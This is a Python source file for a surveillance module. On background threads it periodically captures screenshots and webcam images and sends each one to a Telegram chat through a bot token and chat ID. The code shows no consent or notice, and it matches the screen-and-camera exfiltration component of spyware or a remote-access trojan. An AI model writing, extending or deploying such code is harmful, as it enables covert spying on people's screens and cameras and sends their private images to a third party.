import threading
import datetime
import time
import cv2
from PIL import ImageGrab
import asyncio
import logging

class WebcamScreenshot:
    def __init__(self, webcam_interval, screenshot_interval, logger, api_token=None, chat_id=None, telegram_handler=None, loop=None):
        self.webcam_interval = webcam_interval
        self.screenshot_interval = screenshot_interval
        self.logger = logger
        self.api_token = api_token
        self.chat_id = chat_id
        self.telegram_handler = telegram_handler
        self.loop = loop
        self.stop_event = threading.Event()
        self.webcam_thread = None
        self.screenshot_thread = None

    def capture_screenshot(self):
        try:
            img = ImageGrab.grab()
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            img.save(filename)
            self.logger.info(f"Screenshot saved: {filename}")
            if self.telegram_handler and self.api_token and self.chat_id:
                self.loop.call_soon_threadsafe(asyncio.ensure_future, self.telegram_handler.send_image_to_telegram(filename))
        except Exception as e:
            self.logger.error(f"Error capturing screenshot: {e}")

    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_{timestamp}.png"
                cv2.imwrite(filename, frame)
                self.logger.info(f"Webcam image saved: {filename}")
                if self.telegram_handler and self.api_token and self.chat_id:
                    self.loop.call_soon_threadsafe(asyncio.ensure_future, self.telegram_handler.send_image_to_telegram(filename))
            cap.release()
        except Exception as e:
            self.logger.error(f"Error capturing webcam image: {e}")

    def webcam_monitor(self):
        while not self.stop_event.is_set():
            self.capture_webcam()
            time.sleep(self.webcam_interval)

    def screenshot_monitor(self):
        while not self.stop_event.is_set():
            self.capture_screenshot()
            time.sleep(self.screenshot_interval)

    def start_webcam_monitor(self):
        self.webcam_thread = threading.Thread(target=self.webcam_monitor, daemon=True)
        self.webcam_thread.start()

    def start_screenshot_monitor(self):
        self.screenshot_thread = threading.Thread(target=self.screenshot_monitor, daemon=True)
        self.screenshot_thread.start()

    def stop_monitors(self):
        self.stop_event.set()
        if self.webcam_thread and self.webcam_thread.is_alive():
            self.webcam_thread.join()
        if self.screenshot_thread and self.screenshot_thread.is_alive():
            self.screenshot_thread.join()
